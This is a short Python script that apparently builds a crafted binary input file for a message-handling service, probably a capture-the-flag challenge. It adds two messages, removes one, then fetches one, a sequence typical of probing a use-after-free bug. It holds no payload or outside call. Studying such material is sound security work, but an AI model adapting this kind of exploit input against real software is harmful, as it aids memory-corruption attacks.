#!/usr/bin/python
import sys
import subprocess
import time

cmd_addmsg = chr(0x10)
cmd_rmmsg = chr(0x50)
cmd_getmsg = chr(0x30)
cmd_getallmsg = chr(0x60)


with open('x', 'w+b') as fd:
    fd.write(chr(0x80 | 0x1F | 0x0))
    fd.write(cmd_addmsg)
    fd.write('\x01')
    fd.write('a' * (0x1F - 2))

    fd.write(chr(0x80 | 0x1F | 0x0))
    fd.write(cmd_addmsg)
    fd.write('\x01')
    fd.write('b' * (0x1F - 2))

    fd.write(chr(0x80 | 0x1F | 0x0))
    fd.write(cmd_rmmsg)
    fd.write('\x00')
    fd.write('c' * (0x1F - 2))

    #######

    fd.write(chr(0x80 | 0x1F | 0x0))
    fd.write(cmd_getmsg)
    fd.write('\x00')
    fd.write('c' * (0x1F - 2))
